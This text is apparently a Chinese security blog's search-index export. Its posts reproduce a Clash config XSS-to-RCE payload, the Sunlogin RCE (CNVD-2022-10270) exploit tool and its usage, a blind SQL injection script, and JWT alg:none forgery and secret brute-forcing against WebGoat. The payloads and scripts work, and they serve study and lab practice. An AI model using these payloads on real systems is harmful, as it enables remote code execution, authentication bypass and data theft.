class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;0.0.0.0:9090&#x27;</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&#x27;&lt;img src=x onerror=alert(1) /&gt;&#x27;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">trojan</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">test</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">45645</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">20133544</span><span class="number">-3417</span><span class="number">-3062</span><span class="string">-8ff8-b1dbd032948f</span></span><br></pre></td></tr></table></figure><p>连接代理</p><p><img src="/posts/cb677a8d/image-20220301225601973.png" alt="image-20220301225601973"></p><p><img src="/posts/cb677a8d/image-20220301225620728.png" alt="image-20220301225620728"></p><p>成功弹窗，因此证明了XSS漏洞存在</p><p>接下来改为RCE漏洞试下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">silent</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;0.0.0.0:9090&#x27;</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&#x27;&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;&#x27;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">trojan</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">test</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">45645</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">20133544</span><span class="number">-3417</span><span class="number">-3062</span><span class="string">-8ff8-b1dbd032948f</span></span><br></pre></td></tr></table></figure><p>连接代理</p><p><img src="/posts/cb677a8d/image-20220301230010284.png" alt="image-20220301230010284"></p><p>命令执行成功</p><p>由此看来这个漏洞有些鸡肋属于<code>self-xss</code>但是要知道Clash的配置文件大部分都是从代理url下载而来，这样以来危险也就由之而来，一些心存心存恶念的人提供一些免费的代理导致贪图便宜的兄弟中招，也就是常见的钓鱼</p><p>并且大部分人使用Clash不会去详细看yml文件，直接下载下来使用最后中招。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>将Clash更新到最新版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向日葵 RCE复现</title>
      <link href="/posts/35386fe0/"/>
      <url>/posts/35386fe0/</url>
      
        <content type="html"><![CDATA[<h1 id="Sunlogin-RCE复现-CNVD-2022-10270"><a href="#Sunlogin-RCE复现-CNVD-2022-10270" class="headerlink" title="Sunlogin RCE复现(CNVD-2022-10270)"></a>Sunlogin RCE复现(CNVD-2022-10270)</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270">https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270</a></p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>windows 个人版 V11.0.0.33 V10.3.0.27372 V11.0.0.33162</p><p>简约版 V1.0.1.43315</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://github.com/Mr-xn/sunlogin_rce/releases">Releases · Mr-xn&#x2F;sunlogin_rce (github.com)</a></p><p>使用方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-h 指定目标</span><br><span class="line"></span><br><span class="line">-t 选择扫描或者命令执行 默认scan</span><br><span class="line"></span><br><span class="line">-p 设置扫描端口范围 默认40000到65535</span><br><span class="line"></span><br><span class="line">-c 需要执行的命令</span><br></pre></td></tr></table></figure><p><img src="/posts/35386fe0/j3qNXASt5GWPMpB.png" alt="image-20220515223200470"></p><p><img src="/posts/35386fe0/qkTbI1ZLEyu2lHM.png" alt="image-20220515223216200"></p><p>经测试好像只有本机利用才会有回显</p><p><img src="/posts/35386fe0/xsfCZyJtE1L2ilj.png" alt="image-20220515223628294"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA安全-JWT安全及预编译 CASE 注入</title>
      <link href="/posts/43f09137/"/>
      <url>/posts/43f09137/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA安全-JWT-安全及预编译-CASE-注入"><a href="#JAVA安全-JWT-安全及预编译-CASE-注入" class="headerlink" title="JAVA安全-JWT 安全及预编译 CASE 注入"></a>JAVA安全-JWT 安全及预编译 CASE 注入</h1><h2 id="JAVA中的sql注入"><a href="#JAVA中的sql注入" class="headerlink" title="JAVA中的sql注入"></a>JAVA中的sql注入</h2><h3 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection(mitigation)"></a>SQL Injection(mitigation)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;&#x27;&quot; +</span></span><br><span class="line">session.getAttribute(<span class="string">&quot;UserID&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数绑定方式，利用了 sql 的预编译技术</span></span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE last_name = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(query);</span><br><span class="line">statement.setString(<span class="number">1</span>, accountName);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line"></span><br><span class="line">上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。</span><br><span class="line"></span><br><span class="line">如参数绑定方式可以使用下面方式绕过。</span><br><span class="line">通过使用 <span class="keyword">case</span> when 语句可以将 order by 后的 orderExpression 表达式中添加 select 语句。（前提是必须存在order by）</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/klyjb/p/11473857.html">JDBC编程之预编译SQL与防注入 - 加了冰的才叫可乐 - 博客园 (cnblogs.com)</a></p><h3 id="Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）"><a href="#Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）" class="headerlink" title="Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）"></a>Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）</h3><p><img src="/posts/43f09137/image-20220204205002145.png" alt="image-20220204205002145"></p><p>点击ip排序</p><p><img src="/posts/43f09137/image-20220204205222142.png" alt="image-20220204205222142"></p><p>将column参数随便改下看下报错</p><p>返回包中发现orderby可以使用case when 绕过</p><p><img src="/posts/43f09137/image-20220204210343988.png" alt="image-20220204210343988"></p><p>使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">chars = digits + <span class="string">&quot;.&quot;</span></span><br><span class="line">data1 = <span class="string">&quot;username_reg=tomx&#x27;+union+select+password+from+sql_challenge_users+where+userid%3D&#x27;teom&#x27;--+-&amp;email_reg=7702%40qq.com&amp;password_reg=123&amp;confirm_password_reg=123&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;JSESSIONID&#x27;</span>: <span class="string">&#x27;lCNtTT1xRD0U-7U8zcjIbyRXzLH_DAvz7jGuMvj0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class="string">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8888&quot;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    temp = result</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        vul_url = <span class="string">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)</span><br><span class="line">        <span class="comment"># print(resp.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;webgoat-prd&#x27;</span> <span class="keyword">in</span> resp.json()[<span class="number">0</span>][<span class="string">&#x27;hostname&#x27;</span>]:</span><br><span class="line">            result += char</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> temp == result:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/posts/43f09137/image-20220204211625244.png" alt="image-20220204211625244"></p><h2 id="什么是-JWT？"><a href="#什么是-JWT？" class="headerlink" title="什么是 JWT？"></a>什么是 JWT？</h2><blockquote><p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改</p></blockquote><p><img src="/posts/43f09137/image-20220205224641299.png" alt="image-20220205224641299"></p><p>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。JWT 的内容以 Base64URL 进行了编码。签名在base64加密前使用密钥加密</p><p><img src="/posts/43f09137/image-20220205110312210.png" alt="image-20220205110312210"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">头部（Header）</span><br><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">alg是说明这个JWT 的签名使用的算法的参数，常见值用 HS256（默认），HS512 等，也可以为 None。HS256表示 HMAC SHA256。</span><br><span class="line">typ说明这个 token 的类型为 JWT</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">声明（Claims）</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1416471934</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;user_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;read&quot;</span><span class="punctuation">,</span> <span class="string">&quot;write&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;authorities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;ROLE_ADMIN&quot;</span><span class="punctuation">,</span> <span class="string">&quot;ROLE_USER&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;client_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-client-with-secret&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">JWT 固定参数有： </span><br><span class="line">iss： 发 行 人 </span><br><span class="line">exp： 到 期 时 间 </span><br><span class="line">sub： 主 题   </span><br><span class="line">aud： 用 户    </span><br><span class="line">nbf：在此之前不可用iat：发布时间</span><br><span class="line">jti：JWT ID 用于标识该 JWT</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">签名（Signature）</span><br><span class="line">服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。</span><br><span class="line">下面是一个用 HS256 生成 JWT 的代码例子</span><br><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(payload)<span class="punctuation">,</span>secret)</span><br></pre></td></tr></table></figure><p>1、用户端登录，用户名和密码在请求中被发往服务器<br>2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，服务器并没有保存登录状态信息。<br>3、服务器将 JWT（通过响应）返回给客户端<br>4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态<br>6、服务器返回响应</p><p><img src="/posts/43f09137/image-20220205111357736.png" alt="image-20220205111357736"></p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="Javaweb-身份验证攻击-JWT-修改伪造攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-修改伪造攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）</h4><p>#了解 JWT 传输过程，验证机制</p><p>#了解 JWT 结构，加解密过程及注意事项</p><p><img src="/posts/43f09137/image-20220205111928593.png" alt="image-20220205111928593"></p><p><img src="/posts/43f09137/image-20220205112844469.png" alt="image-20220205112844469"></p><p>点击切换用户</p><p><img src="/posts/43f09137/image-20220205112926183.png" alt="image-20220205112926183"></p><p>抓包</p><p><img src="/posts/43f09137/image-20220205112938904.png" alt="image-20220205112938904"></p><p>发现access_token值为空</p><p>再点击删除键</p><p><img src="/posts/43f09137/image-20220205113051705.png" alt="image-20220205113051705"></p><p><img src="/posts/43f09137/image-20220205113106249.png" alt="image-20220205113106249"></p><p>数据包中发现access_token值</p><p>到<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>解密看下</p><p><img src="/posts/43f09137/image-20220205114647600.png" alt="image-20220205114647600"></p><p>发现”admin”: “false”,改为true就是管理员权限</p><p>但是这样还不行 我们的签名部分无法修改</p><p>注意：</p><p>问题来了，因为 JWT 的声明内容变了，因此签名需要重新生成，生成签名又需要密码，我们没有密码呀？不要慌，我们直接去掉签名就好~修改头部为 None</p><p>我们无法获取到密钥也就无法更改签名 那么我们就修改头部文件”alg”:”HS256”改为”alg”:”none”</p><p><img src="/posts/43f09137/image-20220205120229198.png" alt="image-20220205120229198"></p><p><img src="/posts/43f09137/image-20220205120509791.png" alt="image-20220205120509791"></p><p>签名部分我们采用不加密也就是要留空</p><p>在 HTTP 传输过程中，Base64 编码中的”&#x3D;”,”+”,”&#x2F;“等特殊符号通过 URL 解码通常容易产生歧义，因此产生了与 URL 兼容的 Base64 URL 编码</p><p>也就是jwt在传输的时候要删掉这些符号</p><p>最后结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAibm9uZSIKfQ.ewogICJpYXQiOiAxNjQ0ODk1ODIyLAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0.</span><br></pre></td></tr></table></figure><p>完成</p><p>再把这串编码拿到burp中修改</p><p>攻击成功前提条件：服务器端没有验证是否有签名</p><h4 id="Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205171436379.png" alt="image-20220205171436379"></p><p>JWT cracking——爆破，需要使用python脚本进行爆破，前提需自备字典。字典够强，就可以跑出来——<a href="https://wws.lanzous.com/icZOyfpz24b"><a href="https://lanzoux.com/icZOyfpz24b">m0re.txt - 蓝奏云 (lanzoux.com)</a></a><br>可以用我现在用的这个试试。测试呢嘛，就直接在源码里找到密码插进去就行。</p><p>注意需要pip安装PyJWT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = <span class="string">R&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0NDA1ODU2MCwiZXhwIjoxNjQ0MDU4NjIwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.OaUiWkNbWlZ2I1owqEeGX1DXTBw3ZRH-Yf3GOX1mXtc&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;‪C:\\Users\\FATBOY\\Desktop\\m0re.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! nothing be found.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/posts/43f09137/image-20220205185622947.png" alt="image-20220205185622947"></p><p>脚本跑出来密匙为 <strong>business</strong></p><p>继续去<a href="https://jwt.io/%E8%A7%A3%E5%AF%86">https://jwt.io/解密</a></p><p><img src="/posts/43f09137/image-20220205185819944.png" alt="image-20220205185819944"></p><p><img src="/posts/43f09137/image-20220205205823502.png" alt="image-20220205205823502"></p><h4 id="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205214813724-16440688965541.png" alt="image-20220205214813724"></p><p><img src="/posts/43f09137/image-20220205214855195-16440689380832.png" alt="image-20220205214855195"></p><p>查看日志</p><p><img src="/posts/43f09137/image-20220205214912474.png" alt="image-20220205214912474"></p><p>发现token解密下</p><p><img src="/posts/43f09137/image-20220205214949819-16440689920343.png" alt="image-20220205214949819"></p><p>更改失效时间</p><p><img src="/posts/43f09137/image-20220205215204437.png" alt="image-20220205215204437"></p><p>使用第四关绕过签名的方法</p><p><img src="/posts/43f09137/image-20220205215938396.png" alt="image-20220205215938396"></p><p><img src="/posts/43f09137/image-20220205215912616.png" alt="image-20220205215912616"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAibm9uZSIKfQ.ewogICJpYXQiOiAxNTI2MTMxNDExLAogICJleHAiOiAxNjQ0MDc5MTAzLAogICJhZG1pbiI6ICJmYWxzZSIsCiAgInVzZXIiOiAiVG9tIgp9.</span><br></pre></td></tr></table></figure><p>点击checkout抓包</p><p><img src="/posts/43f09137/image-20220205215549153.png" alt="image-20220205215549153"></p><p>更改数据</p><p><img src="/posts/43f09137/image-20220205215817789-16440695032324.png" alt="image-20220205215817789"></p><h4 id="Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）</h4><p>参考：<a href="https://www.freebuf.com/vuls/216457.html">Java代码审计入门：WebGoat8（再会） - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
